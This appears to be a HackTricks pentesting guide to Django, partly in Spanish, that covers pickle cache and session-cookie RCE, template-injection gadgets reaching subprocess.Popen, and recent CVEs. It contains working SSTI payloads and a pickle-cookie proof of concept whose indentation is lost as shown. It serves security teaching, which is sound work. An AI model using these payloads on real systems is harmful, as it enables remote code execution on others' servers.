# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
El método de almacenamiento de cache por defecto de Django es [Python pickles], lo que puede conducir a RCE si [untrusted input is unpickled]. **Si un atacante puede obtener acceso de escritura al cache, puede escalar esta vulnerabilidad a RCE en el servidor subyacente**.

El cache de Django se almacena en uno de cuatro sitios: [Redis], [memory], [files], o una [database]. El cache almacenado en un servidor Redis o en una base de datos son los vectores de ataque más probables (Redis injection y SQL injection), pero un atacante también podría usar el cache basado en archivos para convertir una escritura arbitraria en RCE. Los mantenedores lo han marcado como no problemático. Es importante tener en cuenta que la carpeta de archivos del cache, el nombre de la tabla SQL y los detalles del servidor Redis variarán según la implementación.

Este informe de HackerOne proporciona un gran ejemplo reproducible de explotación del cache de Django almacenado en una base de datos SQLite: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
La Django Template Language (DTL) es **Turing-complete**. Si datos proporcionados por el usuario se renderizan como una *template string* (por ejemplo llamando a `Template(user_input).render()` o cuando `|safe`/`format_html()` elimina el auto-escaping), un atacante puede lograr SSTI completo → RCE.

### Detección
1. Busca llamadas dinámicas a `Template()` / `Engine.from_string()` / `render_to_string()` que incluyan *cualquier* dato de la solicitud sin sanear.
2. Envía una payload basada en tiempo o aritmética:
```django
{{7*7}}
```
Si la salida renderizada contiene `49`, la entrada está siendo compilada por el motor de plantillas.

### Primitive to RCE
Django blocks direct access to `__import__`, but the Python object graph is reachable:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Encuentra el índice de `subprocess.Popen` (≈400–500 según la build de Python) y ejecuta comandos arbitrarios:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Un gadget universal más seguro es iterar hasta que `cls.__name__ == 'Popen'`.

El mismo gadget funciona para las funcionalidades de renderizado de plantillas de **Debug Toolbar** o **Django-CMS** que manejan incorrectamente la entrada del usuario.

---

### Véase también: ReportLab/xhtml2pdf PDF export RCE
Las aplicaciones basadas en Django comúnmente integran xhtml2pdf/ReportLab para exportar vistas como PDF. Cuando HTML controlado por el usuario fluye hacia la generación de PDF, rl_safe_eval puede evaluar expresiones dentro de triple corchetes `[[[ ... ]]]`, lo que permite ejecución de código (CVE-2023-33733). Detalles, payloads, y mitigaciones:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
If the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.

### Exploit Requirements
* El servidor usa `PickleSerializer`.
* El atacante conoce / puede adivinar `settings.SECRET_KEY` (leaks via GitHub, `.env`, páginas de error, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Envía la cookie resultante, y el payload se ejecuta con los permisos del worker WSGI.

**Mitigations**: Mantén el `JSONSerializer` por defecto, rota `SECRET_KEY`, y configura `SESSION_COOKIE_HTTPONLY`.

---

## Recientes (2023-2025) CVEs de alto impacto de Django que los Pentesters deben revisar
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixeado el 4 de junio de 2025). Permite a atacantes introducir saltos de línea/códigos ANSI en archivos de log y envenenar el análisis de logs aguas abajo. Nivel de parche ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* en `QuerySet.values()/values_list()` sobre `JSONField` (CVSS 9.8). Forja claves JSON para romper las comillas y ejecutar SQL arbitrario. Fijado en 4.2.15 / 5.0.8.

Siempre identifica la versión exacta del framework mediante la página de error `X-Frame-Options` o el hash de `/static/admin/css/base.css` y prueba lo anterior cuando proceda.

---

## Referencias
* Aviso de seguridad de Django – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
